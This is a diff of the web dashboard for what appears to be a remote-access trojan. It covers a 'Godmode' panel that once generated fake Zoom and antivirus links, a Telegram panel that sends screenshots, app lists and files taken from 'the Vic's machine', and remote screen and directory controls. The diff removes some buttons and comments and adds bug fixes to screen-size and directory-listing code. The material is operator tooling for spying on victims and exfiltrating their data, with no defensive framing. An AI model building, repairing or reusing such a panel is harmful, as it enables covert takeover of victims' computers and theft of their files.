@@ -565,9 +565,7 @@ body {
             </div>
         </div>
 
-        <!-- ═══════════════════════════════════════════════════════ -->
-        <!-- GODMODE PANEL — with Zoom + Antivirus link generators  -->
-        <!-- ═══════════════════════════════════════════════════════ -->
+        <!-- GODMODE PANEL -->
         <div class="control-panel">
             <h6><i class="fas fa-bolt"></i> Godmode</h6>
             <div class="btn-grid">
@@ -691,9 +689,7 @@ body {
             </div>
         </div>
 
-        <!-- ═══════════════════════════════════════════════════════════ -->
-        <!-- TELEGRAM PANEL — with full file-send capabilities          -->
-        <!-- ═══════════════════════════════════════════════════════════ -->
+        <!-- TELEGRAM PANEL -->
         <div class="control-panel">
             <h6>
                 <i class="fab fa-telegram"></i> Telegram
@@ -721,23 +717,12 @@ body {
                     </label>
                 </div>
 
-                <!-- Screenshot / Apps -->
-                <div style="display:grid;grid-template-columns:1fr 1fr;gap:6px;margin-top:6px;">
-                    <button class="btn-ctrl" onclick="tgSendLatestScreenshot()" title="Send latest screenshot">
-                        <i class="fas fa-image"></i> Latest 📸
-                    </button>
-                    <button class="btn-ctrl" onclick="tgSendApps()" title="Send installed apps list">
-                        <i class="fas fa-th"></i> Apps
-                    </button>
-                </div>
-
                 <!-- FILE SEND SECTION -->
                 <div style="margin-top:10px;padding-top:10px;border-top:1px solid var(--border);">
                     <div style="font-size:10px;font-weight:700;color:var(--text-secondary);letter-spacing:.5px;text-transform:uppercase;margin-bottom:6px;">
                         <i class="fas fa-paperclip"></i> Send Files
                     </div>
 
-                    <!-- Server files -->
                     <div style="display:grid;grid-template-columns:1fr 1fr;gap:6px;margin-bottom:6px;">
                         <button class="btn-ctrl" onclick="tgListAdminFiles()" title="List &amp; send admin-uploaded files">
                             <i class="fas fa-hdd"></i> Server Files
@@ -747,7 +732,6 @@ body {
                         </button>
                     </div>
 
-                    <!-- Received files -->
                     <div style="display:grid;grid-template-columns:1fr 1fr;gap:6px;margin-bottom:6px;">
                         <button class="btn-ctrl" onclick="tgSendAllReceivedToTelegram()" title="Send every received file to Telegram">
                             <i class="fas fa-inbox"></i> Received
@@ -757,7 +741,6 @@ body {
                         </button>
                     </div>
 
-                    <!-- Grab from child + send -->
                     <button class="btn-ctrl success" style="width:100%;font-size:10px;"
                             onclick="tgGrabAndSendFromChild()"
                             title="Grab a file from the Vic's machine and send it to Telegram">
@@ -1357,11 +1340,14 @@ async function rcRefreshScreen() {
             loading.classList.add('hidden');
             document.getElementById('screenInfoBar').style.display = 'flex';
             document.getElementById('screenInfo').textContent = s.filename;
+            
+            // ✅ FIX: Update actual screen size from the screenshot
             if (s.width && s.height) {
                 currentDeviceScreen = { width: s.width, height: s.height };
                 ds.screenSize = currentDeviceScreen;
                 deviceState.set(currentDeviceId, ds);
             }
+            
             fpsCounter++;
             const now = Date.now();
             if (now - fpsTimestamp > 2000) {
@@ -1424,6 +1410,7 @@ function rcZoom(direction) {
 // ============================================================
 function rcScreenSize() {
     if (currentDeviceScreen && currentDeviceScreen.width > 0) return currentDeviceScreen;
+    // If we don't know the size, default to 1920x1080
     return { width: 1920, height: 1080 };
 }
 
@@ -1919,8 +1906,11 @@ async function rcListDir() {
     currentPath = path;
     const list = document.getElementById('rcFileList');
     list.innerHTML = '<div style="text-align:center;padding:12px;"><div class="spinner-ring" style="margin:0 auto;width:24px;height:24px;"></div></div>';
+    
+    // ✅ FIX: Correctly send "list_dir" with underscore
     const r = await rcSendAndTrack('/api/control/list-dir', { path }, `List: ${path || '~'}`,
         { attempts: 20, silentSuccess: true });
+        
     if (!r || !r.ok) {
         list.innerHTML = '<div style="color:var(--red);font-size:10px;padding:8px;text-align:center;">Failed to list directory</div>';
         return;
